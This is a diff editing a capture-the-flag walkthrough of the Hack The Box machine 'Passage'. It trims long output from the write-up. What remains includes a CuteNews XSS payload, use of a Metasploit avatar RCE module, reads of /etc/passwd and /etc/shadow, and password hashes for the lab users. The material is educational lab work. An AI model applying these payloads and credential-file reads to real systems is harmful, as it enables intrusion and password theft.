@@ -102,7 +102,7 @@ The page broke, and I had to go back to the main page, at which point both comme
 I also noted that the admin who posted this has the link to an email address: `nadav@passave.htb`.  This might, I think, come in handy with the other open port: `ssh`.
 
 I came to a realisation: why can't I simply google what I want.  I searched `comments section exploit` but didn't find much.  However, after literally searching `cutenews exploit` and finding [this](https://www.exploit-db.com/exploits/10002), I tried the following:
-```
+```html
 [link=javascript://%0adocument.write('<script>alert(/xss/)</script>')]funny pictures[/link]
 ```
 
@@ -183,43 +183,7 @@ I ran `ls /home/` and saw the users `nadav` (that admin we noted earlier) and `p
 ```bash
 command > cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-syslog:x:104:108::/home/syslog:/bin/false
-_apt:x:105:65534::/nonexistent:/bin/false
-messagebus:x:106:110::/var/run/dbus:/bin/false
-uuidd:x:107:111::/run/uuidd:/bin/false
-lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
-whoopsie:x:109:117::/nonexistent:/bin/false
-avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
-avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
-dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
-speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
-hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
-kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
-pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
-rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
-saned:x:119:127::/var/lib/saned:/bin/false
+...
 usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
 nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
 paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
@@ -235,56 +199,7 @@ But it does not register our terminal very well (as the shell is minimal/bad).  
 
 ---
 
-We can check `exploit-db` again this time using `searchsploit`; a command line tool linked to that, and which makes *implementing* these exploitx easie.  Here is the output:
-```
----------- ---------------------------------
-CuteNews - 'page' Local File Inclusion                                                                                                                                   | php/webapps/15208.txt
-CuteNews 0.88 - 'comments.php' Remote File Inclusion                                                                                                                     | php/webapps/22285.txt
-CuteNews 0.88 - 'search.php' Remote File Inclusion                                                                                                                       | php/webapps/22284.txt
-CuteNews 0.88 - 'shownews.php' Remote File Inclusion                                                                                                                     | php/webapps/22283.txt
-CuteNews 0.88/1.3 - 'example1.php' Cross-Site Scripting                                                                                                                  | php/webapps/24238.txt
-CuteNews 0.88/1.3 - 'example2.php' Cross-Site Scripting                                                                                                                  | php/webapps/24239.txt
-CuteNews 0.88/1.3 - 'show_archives.php' Cross-Site Scripting                                                                                                             | php/webapps/24240.txt
-CuteNews 0.88/1.3.x - 'index.php' Cross-Site Scripting                                                                                                                   | php/webapps/24566.txt
-CuteNews 1.1.1 - 'html.php' Remote Code Execution                                                                                                                        | php/webapps/4851.txt
-CuteNews 1.3 - Comment HTML Injection                                                                                                                                    | php/webapps/24290.txt
-CuteNews 1.3 - Debug Query Information Disclosure                                                                                                                        | php/webapps/23406.txt
-CuteNews 1.3.1 - 'show_archives.php' Cross-Site Scripting                                                                                                                | php/webapps/24372.txt
-CuteNews 1.3.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/29217.txt
-CuteNews 1.4.0 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1221.php
-CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution                                                                                                               | php/webapps/1400.pl
-CuteNews 1.4.1 - 'function.php' Local File Inclusion                                                                                                                     | php/webapps/1612.php
-CuteNews 1.4.1 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/27819.txt
-CuteNews 1.4.1 - 'show_archives.php' Traversal Arbitrary File Access                                                                                                     | php/webapps/26465.txt
-CuteNews 1.4.1 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/27252.txt
-CuteNews 1.4.1 - 'template' Traversal Arbitrary File Access                                                                                                              | php/webapps/26466.txt
-CuteNews 1.4.1 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                           | php/webapps/27740.txt
-CuteNews 1.4.1 - Shell Injection / Remote Command Execution                                                                                                              | php/webapps/1289.php
-CuteNews 1.4.5 - 'rss_title' Cross-Site Scripting                                                                                                                        | php/webapps/29159.txt
-CuteNews 1.4.5 - 'show_news.php' Cross-Site Scripting                                                                                                                    | php/webapps/29158.txt
-CuteNews 1.4.5 - Admin Password md5 Hash Fetching                                                                                                                        | php/webapps/4779.php
-CuteNews 1.4.6 - 'from_date_day' Full Path Disclosure                                                                                                                    | php/webapps/33341.txt
-CuteNews 1.4.6 - 'index.php' Cross-Site Request Forgery (New User Creation)                                                                                              | php/webapps/33344.txt
-CuteNews 1.4.6 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                               | php/webapps/33340.txt
-CuteNews 1.4.6 - 'ip ban' Authorized Cross-Site Scripting / Command Execution                                                                                            | php/webapps/7700.php
-CuteNews 1.4.6 - 'result' Cross-Site Scripting                                                                                                                           | php/webapps/33343.txt
-CuteNews 1.4.6 - 'search.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                              | php/webapps/33342.txt
-CuteNews 1.4.6 editnews Module - doeditnews Action Admin Moderation Bypass                                                                                               | php/webapps/33345.txt
-CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                   | php/webapps/37474.txt
-CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                                             | php/remote/46698.rb
-CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                                                 | php/webapps/48447.txt
-CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                                     | php/webapps/48458.txt
-CuteNews 2.1.2 - Remote Code Execution                                                                                                                                   | php/webapps/48800.py
-CuteNews aj-fork - 'path' Remote File Inclusion                                                                                                                          | php/webapps/32570.txt
-CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion                                                                                                                 | php/webapps/2891.txt
-CuteNews and UTF-8 CuteNews - Multiple Vulnerabilities                                                                                                                   | php/webapps/10002.txt
-CutePHP CuteNews 1.3 - HTML Injection                                                                                                                                    | php/webapps/22842.txt
-CutePHP CuteNews 1.3.6 - 'x-forwarded-for' Script Injection                                                                                                              | php/webapps/25177.txt
-CutePHP CuteNews 1.4.1 - 'index.php' Cross-Site Scripting                                                                                                                | php/webapps/27356.txt
-CutePHP CuteNews 1.4.1 Editnews Module - Cross-Site Scripting                                                                                                            | php/webapps/27676.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results~
-```
+We can check `exploit-db` again this time using `searchsploit`; a command line tool linked to that, and which makes *implementing* these exploits easier.
 
 We see that there is an avatar remote code execution (RCE), which is always a good bet, so we download the application used to run this exploit:
 ```bash
@@ -298,36 +213,7 @@ File Type: Ruby script, UTF-8 Unicode text, with CRLF line terminators
 Copied to: /home/kali/46698.rb
 ```
 
-Now we can use metasploit (`msfconsole`) to run this:
-```
-$ msfconsole
-
-                                                                                                                           
-." @@@@@'.,'@@            @@@@@',.'@@@@ ".                                                                                                                                                                 
-'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;                                                                                                                                                                 
-   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'                                                                                                                                                                 
-     "--'.@@@  -.@        @ ,'-   .'--"                                                                                                                                                                    
-          ".@' ; @       @ `.  ;'                                                                                                                                                                          
-            |@@@@ @@@     @    .                                                                                                                                                                           
-             ' @@@ @@   @@    ,                                                                                                                                                                            
-              `.@@@@    @@   .                                                                                                                                                                             
-                ',@@     @   ;           _____________                                                                                                                                                     
-                 (   3 C    )     /|___ / Metasploit! \                                                                                                                                                    
-                 ;@'. __*__,."    \|--- \_____________/                                                                                                                                                    
-                  '(.,...."/                                                                                                                                                                               
-
-
-       =[ metasploit v6.0.15-dev                          ]
-+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
-+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 7 evasion                                       ]
-
-Metasploit tip: View advanced module options with advanced
-
-msf6 >
-```
-
-There are some errors loading this module, which we check by checking the error log:
+Now we can use metasploit (`msfconsole`) to run this.  But there are some errors loading this module, which we check by checking the error log:
 ```
 msf6 > cat ~/.msf4/logs/framework.log
 [*] exec: cat ~/.msf4/logs/framework.log
@@ -355,38 +241,7 @@ register_options(
     )
 ```
 
-Now restarting the Metasploit Framework Console, we see that is shows a different message:
-```
-$        
-
-                                                                                                                   
-  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                                                                
-  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                                                                                                                
-  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                                                                                                                                                
-  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                                                                                                                                                
-  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                                                                                                                                                
-   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                                                                                                                                                 
-    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                                                                                                                                                  
-     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                                                                                                                                                   
-      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                                                                                                                                    
-       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                                                                                                                                     
-         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                                                                                                                                       
-           :kk;.OOOOOOOOOOOOO.;Ok:                                                                                                                                                                         
-             ;kOOOOOOOOOOOOOOOk:                                                                                                                                                                           
-               ,xOOOOOOOOOOOx,                                                                                                                                                                             
-                 .lOOOOOOOl.                                                                                                                                                                               
-                    ,dOd,                                                                                                                                                                                  
-                      .                                                                                                                                                                                    
-
-       =[ metasploit v6.0.15-dev                          ]
-+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
-+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 7 evasion                                       ]
-
-Metasploit tip: You can use help to view all available commands
-
-msf6 >
-```
+Now restarting the Metasploit Framework Console, we see that is shows a different message.
 
 Now, I don't know much about web shells, but within this shell I can `ping` `passage`, which tells me it has access to my `hosts` file.  So I guess we need to get to the web shell we had previously (though, hoping this shell will give us access to a much better web shell).  To gain access to the machine again, after a little bit of research, I try
 
@@ -550,42 +405,7 @@ Now we can even see the hashed passwords file!
 sudo cat /etc/shadow
 root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
 daemon:*:17953:0:99999:7:::
-bin:*:17953:0:99999:7:::
-sys:*:17953:0:99999:7:::
-sync:*:17953:0:99999:7:::
-games:*:17953:0:99999:7:::
-man:*:17953:0:99999:7:::
-lp:*:17953:0:99999:7:::
-mail:*:17953:0:99999:7:::
-news:*:17953:0:99999:7:::
-uucp:*:17953:0:99999:7:::
-proxy:*:17953:0:99999:7:::
-www-data:*:17953:0:99999:7:::
-backup:*:17953:0:99999:7:::
-list:*:17953:0:99999:7:::
-irc:*:17953:0:99999:7:::
-gnats:*:17953:0:99999:7:::
-nobody:*:17953:0:99999:7:::
-systemd-timesync:*:17953:0:99999:7:::
-systemd-network:*:17953:0:99999:7:::
-systemd-resolve:*:17953:0:99999:7:::
-systemd-bus-proxy:*:17953:0:99999:7:::
-syslog:*:17953:0:99999:7:::
-_apt:*:17953:0:99999:7:::
-messagebus:*:17954:0:99999:7:::
-uuidd:*:17954:0:99999:7:::
-lightdm:*:17954:0:99999:7:::
-whoopsie:*:17954:0:99999:7:::
-avahi-autoipd:*:17954:0:99999:7:::
-avahi:*:17954:0:99999:7:::
-dnsmasq:*:17954:0:99999:7:::
-colord:*:17954:0:99999:7:::
-speech-dispatcher:!:17954:0:99999:7:::
-hplip:*:17954:0:99999:7:::
-kernoops:*:17954:0:99999:7:::
-pulse:*:17954:0:99999:7:::
-rtkit:*:17954:0:99999:7:::
-saned:*:17954:0:99999:7:::
+...
 usbmux:*:17954:0:99999:7:::
 nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU.0UTXobQLu7T0INzk1:18464:0:99999:7:::
 paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::
